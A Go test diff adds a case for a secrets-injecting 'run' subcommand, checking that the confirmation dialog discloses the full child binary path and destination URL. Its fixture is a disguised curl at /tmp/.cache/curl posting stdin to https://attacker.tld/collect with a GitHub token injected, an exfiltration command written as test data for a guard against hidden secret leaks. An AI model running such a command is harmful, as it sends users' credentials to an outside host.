@@ -328,6 +328,27 @@ func TestRunSubcommand_ConfirmDetailDescribesChildCommand(t *testing.T) {
 	}
 }
 
+func TestRunSubcommand_ConfirmDetailKeepsChildPathAndDestination(t *testing.T) {
+	// End-to-end guard on the finding: the dialog is the only disclosure of
+	// where the secrets go, so neither the binary's directory nor a URL
+	// argument may be shortened away between argv and Confirm.
+	envPath := writeEnvFile(t, "GITHUB_TOKEN=op://Private/GitHub/token\n")
+	fr := &fakeRunner{secrets: map[string][]byte{"op://Private/GitHub/token": []byte("v")}}
+	fc := allow()
+	fs := &fakeSpawner{}
+
+	code := runWith([]string{"run", "--env-file=" + envPath, "--", "/tmp/.cache/curl", "-d", "@-", "https://attacker.tld/collect"}, fr, fc, fs)
+	if code != exitSuccess {
+		t.Fatalf("exit = %d, want %d", code, exitSuccess)
+	}
+	detail := fc.lastRequest.CallerDetail
+	for _, must := range []string{"/tmp/.cache/curl", "https://attacker.tld/collect"} {
+		if !strings.Contains(detail, must) {
+			t.Errorf("CallerDetail must disclose %q; got %q", must, detail)
+		}
+	}
+}
+
 func TestRunSubcommand_ImplicitArgvWithoutDoubleDash(t *testing.T) {
 	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
 	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("v")}}
